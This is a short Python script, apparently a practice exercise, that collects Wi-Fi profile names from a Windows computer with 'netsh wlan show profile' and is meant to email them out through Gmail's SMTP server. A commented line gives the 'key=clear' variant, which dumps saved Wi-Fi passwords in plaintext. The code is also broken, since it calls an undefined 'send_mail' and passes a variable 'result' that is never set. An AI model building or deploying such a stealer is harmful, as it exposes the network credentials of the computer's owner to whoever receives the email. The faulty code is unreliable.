#!/usr/bin/env python

import subprocess, smtplib, re

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
    #using gmail's SMPT server on port 587
    #need to enable Less secure app access in Google account settings if using Gmail
    #https://myaccount.google.com/security
    
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    #(from_addr, to_addr, message)
    
    server.quit()
    

#command = "msg * Test Message"
#command = "netsh wlan show profile <ESSID> key=clear" #-show wlan profiles stored on winx computer, key in plaintext form
email = input("Enter email address to send to: ")
password = input("Enter email password: ")
#command = "hostname"
#result = subprocess.check_output(command, shell=True)

command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer

networks = subprocess.check_output(command, shell=True)
#network_names = re.search("(?:Profile\s*:\s) (.*)", networks)
# \s regex to search for blank space, * specifies any number of blank spaces
# ( second group - . -any char, * - any number of ocurrences
# ?: - non-capturing group

network_names = re.findall("(?:Profile\s*:\s) (.*)", networks)
#findall is a new RE that will return any instances of the text specified and place in list

print(network_names)

#print(network_names.group(0))

send_mail(email, password, result)
#no hardcoded creds to see here, move along creeps
#subprocess.Popen(command, shell=True)
